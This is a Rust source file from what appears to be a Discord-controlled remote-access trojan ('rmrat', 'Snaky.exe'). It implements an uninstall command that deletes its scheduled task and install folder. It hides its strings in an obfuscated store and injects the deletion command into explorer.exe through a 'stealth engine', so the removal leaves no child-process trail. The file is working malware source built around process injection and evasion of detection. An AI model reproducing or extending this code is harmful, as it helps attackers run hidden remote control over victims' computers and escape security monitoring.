use crate::commands::*;
use crate::config::Config;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::{Context, Result};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct UninstallCommand;

#[async_trait]
impl BotCommand for UninstallCommand {
    fn name(&self) -> &str { "uninstall" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "UNINSTALL").into_boxed_str())
    }
    fn category(&self) -> &str { "core" }
    fn usage(&self) -> &str { ".uninstall" }
    fn examples(&self) -> &'static [&'static str] { &[] }
    fn aliases(&self) -> &'static [&'static str] { &["rmrat", "uni"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::Msg, "MSG_UNINSTALL_OK")).await?;

        self.sched_uninstall()?;

        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
        std::process::exit(0);
    }
}

impl UninstallCommand {
    fn sched_uninstall(&self) -> Result<()> {
        let curr_exe = env::current_exe().context("Failed to get current executable path")?;
        let install_dir = curr_exe.parent().context("Failed to get parent directory")?;
        let install_dir_path = install_dir.to_string_lossy().to_string();
        let task_name = Config::get_startup_config().task_name;

        // Command to execute in the background via KCT Phantom Fiber:
        // Wait 3 seconds, delete the scheduled task, and forcefully remove the startup directory
        let cmd = StegoStore::get(StringCategory::Const, "UNINSTALL_KCT_CMD")
            .replace("{}", &task_name)
            .replace("{}", &install_dir_path);

        // Find explorer.exe PID
        let mut pid = 0;
        let mut manager = crate::core::process::ProcessManager::new();
        for process in manager.find_processes_by_name("explorer.exe") {
            if process.name.to_lowercase() == "explorer.exe" {
                pid = process.pid;
                break;
            }
        }

        if pid != 0 {
             if let Some(engine) = crate::stealth::get_engine() {
                 unsafe { 
                     // Inject the deletion command into explorer's KCT 
                     // explorer.exe will cleanly execute the self-delete without spawning a child from Snaky.exe
                     let _ = engine.kct_inject(pid, 2, &cmd); 
                 }
             } else {
                 return Err(anyhow::anyhow!("Stealth engine not found during uninstall scheduling"));
             }
        } else {
             return Err(anyhow::anyhow!("Explorer.exe not found to inject uninstall sequence"));
        }

        Ok(())
    }
}
